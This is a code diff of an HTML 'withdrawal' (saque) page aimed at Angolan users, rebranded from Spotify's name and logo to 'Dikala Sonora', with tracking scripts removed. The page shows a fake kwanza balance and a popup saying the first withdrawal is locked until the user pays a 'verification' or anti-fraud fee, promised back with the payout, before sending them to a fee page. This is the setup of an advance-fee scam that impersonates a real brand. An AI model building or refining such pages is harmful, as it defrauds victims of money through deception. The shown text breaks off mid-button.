@@ -10,24 +10,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Spotify Angola - Saque</title>
-    
-    <script
-      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-      data-utmify-prevent-xcod-sck
-      data-utmify-prevent-subids
-      async
-      defer
-    ></script>
-<script>
-  window.pixelId = "6a1aa02138bfbe88dc6754d3";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
 
-    
+
+
+
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -38,8 +24,8 @@
         }
 
         body {
-            background-color: #121212;
-            color: white;
+            background-color: #f0f2f5;
+            color: #121212;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -48,28 +34,83 @@
 
         .header {
             width: 100%;
-            padding: 20px 30px;
+            padding: 15px 30px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background-color: #000;
+            background-color: #ffffff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.07);
             position: fixed;
             top: 0;
             z-index: 100;
         }
 
         .logo {
-            height: 40px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .logo img {
+            height: 70px;
+            width: auto;
+        }
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            color: #121212;
+        }
+
+        .superscript {
+            font-size: 10px;
+            vertical-align: super;
+            color: #888;
+        }
+
+        .balance-wrapper {
+            position: relative;
+            padding: 2px;
+            border-radius: 6px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .balance-wrapper::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(transparent, transparent, transparent, #e60000);
+            animation: rotate-border 3s linear infinite;
+            z-index: 1;
+        }
+
+        @keyframes rotate-border {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         .balance-container {
-            background-color: #1a1a1a;
+            position: relative;
+            background-color: #ffffff;
             padding: 8px 16px;
-            border-radius: 20px;
+            border-radius: 4px;
             font-weight: 700;
-            color: #1ed760;
-            font-size: 16px;
-            border: 1px solid #333;
+            font-size: 14px;
+            color: #000000;
+            z-index: 2;
+            border: none;
         }
 
         .container {
@@ -106,9 +147,8 @@
         }
 
         .method {
-            background-color: #1e1e1e;
-            /* Darker grey */
-            border: 2px solid #333;
+            background-color: #ffffff;
+            border: 2px solid #ddd;
             border-radius: 12px;
             padding: 20px;
             width: 120px;
@@ -119,6 +159,7 @@
             justify-content: center;
             cursor: pointer;
             transition: all 0.2s;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
         }
 
         .method img,
@@ -130,7 +171,7 @@
 
         .method span {
             font-size: 12px;
-            color: #b3b3b3;
+            color: #555;
             font-weight: 600;
         }
 
@@ -222,6 +263,7 @@
 
         .error-popup-content {
             background-color: #121212;
+            color: white;
             padding: 40px 20px;
             border-radius: 16px;
             text-align: center;
@@ -290,9 +332,13 @@
 <body>
 
     <div class="header">
-        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_Green.png" alt="Spotify"
-            class="logo">
-        <div class="balance-container" id="headerBalance">0,00 Kz</div>
+        <div class="logo">
+            <img src="dikala logo.png" alt="Dikala Sonora">
+            <span class="logo-text">Dikala Sonora<span class="superscript">®</span></span>
+        </div>
+        <div class="balance-wrapper">
+            <div class="balance-container" id="headerBalance">0,00 Kz</div>
+        </div>
     </div>
 
     <div class="container">
@@ -329,24 +375,28 @@
     <div class="overlay" id="unlockOverlay">
         <div class="error-popup-content">
             <div class="error-icon">!</div>
-            <h2>Desbloqueie seu saldo!</h2>
+            <h2>Verificação de Conta Necessária</h2>
 
             <div class="warning-bar" id="errorMethodText">
-                Express não cadastrado...
+                Verificação de Conta Necessária...
             </div>
 
             <p class="info-text">
-                Para receber o seu 1º saque no valor de <span class="highlight-text" id="popupBalanceVal">0,00
-                    Kz</span>, ative sua conta para cadastrar o seu método de pagamento.
+                Para receber o seu primeiro saque no valor de <span class="highlight-text" id="popupBalanceVal">0,00
+                    Kz</span>, é necessário concluir a verificação da sua conta e cadastrar o seu método de pagamento.
             </p>
 
             <p class="info-text">
-                Implementamos uma taxa anti-fraudes para prevenir fraudes e abusos nos saques que estavam ocorrendo no
-                sistema.
+                Esta etapa foi implementada para garantir a segurança dos artistas, anunciantes e ouvintes da Dikala
+                Sonora, além de prevenir atividades fraudulentas na plataforma.
             </p>
 
-            <p class="info-text" style="color: #1ed760;">
-                Fique tranquilo, você receberá o valor da taxa de volta juntamente com o montante do seu saque.
+            <p class="info-text">
+                Após a conclusão da verificação, o seu saque será processado normalmente.
+            </p>
+
+            <p class="info-text" style="color: #e60000; font-weight: 600;">
+                O valor pago na verificação será devolvido juntamente com o montante do seu primeiro saque.
             </p>
 
             <button class="btn-activate" onclick="window.location.href='taxa.html'">ATIVAR CADASTRO E
